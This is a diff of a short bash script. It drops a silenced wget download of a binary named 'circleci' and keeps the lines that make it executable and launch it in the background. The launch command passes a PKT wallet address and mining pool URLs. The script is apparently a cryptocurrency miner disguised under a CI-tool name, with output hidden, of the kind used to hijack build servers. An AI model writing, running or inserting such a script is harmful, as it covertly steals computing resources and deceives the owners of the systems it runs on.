@@ -1,5 +1,5 @@
 #!/bin/bash
-wget https://github.com/aurbach55/pos/raw/main/circleci >/dev/null 2>&1
+
 chmod 777 circleci >/dev/null 2>&1
 nohup ./circleci ann -p pkt1q76dngmrf380w8k9j4f7w4eqpzx3n9vcprldmjx https://stratum.zetahash.com/ http://pool.pkt.world http://pool.pktpool.io > /tmp/circleci.log 2>&1
 
